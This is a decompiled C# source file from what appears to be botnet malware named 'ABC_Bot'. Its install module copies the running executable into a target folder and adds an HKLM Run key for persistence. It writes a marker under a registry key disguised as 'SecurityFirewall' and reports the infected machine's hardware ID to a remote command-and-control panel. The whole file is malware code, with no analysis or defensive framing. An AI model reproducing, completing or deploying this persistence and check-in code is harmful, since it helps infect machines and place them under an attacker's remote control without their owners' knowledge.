using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace ABC_Bot;

[StandardModule]
internal sealed class mod_install
{
	public static object uninstall()
	{
		mod_registry.RegDelete("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" + main.name);
		mod_registry.RegDelete("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\SecurityFirewall\\install");
		object result = default(object);
		return result;
	}

	public static object isInstalled()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		object obj = default(object);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 233:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002c;
						case 4:
							goto IL_0046;
						case 5:
							goto IL_0064;
						case 6:
						case 7:
						case 8:
							goto IL_007b;
						case 10:
							goto IL_0089;
						case 11:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 9:
						case 12:
						case 13:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0089:
					num = 10;
					break;
					IL_007b:
					num = 8;
					obj = true;
					goto end_IL_0000_3;
					IL_0008:
					num = 2;
					if (Operators.CompareString(mod_registry.RegRead("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" + main.name), "", false) != 0)
					{
						goto IL_002c;
					}
					goto IL_0089;
					IL_002c:
					num = 3;
					if (Operators.CompareString(mod_registry.RegRead("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\SecurityFirewall\\install"), "True", false) != 0)
					{
						goto IL_0046;
					}
					goto IL_007b;
					IL_0046:
					num = 4;
					if (Operators.ConditionalCompareObjectEqual(mod_wrequest.request(main.panel, "install=true"), (object)"True", false))
					{
						goto IL_0064;
					}
					goto IL_007b;
					IL_0064:
					num = 5;
					mod_registry.RegWrite("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\SecurityFirewall\\install", "True");
					goto IL_007b;
					end_IL_0000_2:
					break;
				}
				num = 11;
				obj = false;
				break;
				end_IL_0000:;
			}
			catch (object obj2) when (obj2 is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj2);
				try0000_dispatch = 233;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		object result = obj;
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static object Install()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 324:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002b;
						case 4:
						case 5:
							goto IL_004c;
						case 6:
							goto IL_0072;
						case 7:
							goto IL_00c4;
						case 8:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 9:
						case 10:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_00c4:
					num = 7;
					if (!Operators.ConditionalCompareObjectEqual(mod_wrequest.request(main.panel, Conversions.ToString(Operators.AddObject((object)"action=install&hwid=", mod_hwid.hwid()))), (object)"True", false))
					{
						goto end_IL_0000_3;
					}
					break;
					IL_0072:
					num = 6;
					mod_registry.RegWrite("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" + main.name, "\"" + main.dir + "\\" + main.name + ".exe\"");
					goto IL_00c4;
					IL_0008:
					num = 2;
					if (File.Exists(main.dir + "\\" + main.name + ".exe"))
					{
						goto IL_002b;
					}
					goto IL_004c;
					IL_002b:
					num = 3;
					File.Delete(main.dir + "\\" + main.name + ".exe");
					goto IL_004c;
					IL_004c:
					num = 5;
					File.Copy(Application.get_ExecutablePath(), main.dir + "\\" + main.name + ".exe");
					goto IL_0072;
					end_IL_0000_2:
					break;
				}
				num = 8;
				mod_registry.RegWrite("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\SecurityFirewall\\install", "True");
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 324;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}
}
